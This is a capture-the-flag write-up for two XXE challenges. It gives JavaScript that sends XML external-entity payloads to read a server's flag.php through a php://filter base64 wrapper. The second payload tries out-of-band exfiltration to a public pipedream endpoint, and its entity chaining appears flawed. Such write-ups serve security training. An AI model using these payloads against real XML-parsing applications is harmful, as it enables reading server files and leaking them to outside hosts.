# XXE

## XXE1 [https://xxe1.secu-web.blackfoot.dev/]

### Description

XML External Entity (XXE) is a vulnerability that allows an attacker to read files on the server, or even perform SSRF attacks, through the use of XML entities. This vulnerability is often found in web applications that parse XML input.
The website offers a simple user input which get converted into b64 encoded XML and then displayed back to us.
The goal for getting the flag on XXE is to change the XML data sent to the server.
BY using vulnerabilities on the "ENTITY" element,we can insert custom functionality like returning a file flag.

### Solution

The server is already printing the XML data sent to it, so we can just modify the data to include an entity that will read the flag file.
We can modify the source code that is doing the sending, as shown below:
```
const message = "d"
const xml_payload = `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php" >]>
<document>
 <message>&xxe;</message>
 </document>`;

    let g = $.ajax({
      url: "index.php",
      type: "POST",
      data: { xml: btoa(xml_payload) },
      success: response => {
        document.getElementById("error").text = response;
          console.log(g.getAllResponseHeaders(),"\n",response)
      }
    });
```

## XXE2 [https://xxe2.secu-web.blackfoot.dev/]

### Description

Same as XXE1, but we don't have conventient printing of the xml data return, so we need to find a way to get the base64 encoded data to a place we can see it.

### Solution

Similar script to XXE1, but now we have b64 exfil to a public endpoint.

```
const message = "d"
const xml_payload =
      `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php" >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=https://YOUR_URL.m.pipedream.net">
%file;
]>
<document>
 <message>&xxe;</message>
 </document>    `;

    let g = $.ajax({
      url: "index.php",
      type: "POST",
      data: { xml: btoa(xml_payload) },
      success: response => {
        document.getElementById("error").text = response;
          console.log(g.getAllResponseHeaders(),"\n",response)
      }
    });
```

#### Screenshots

#### Resources
 - https://www.pipedream.com/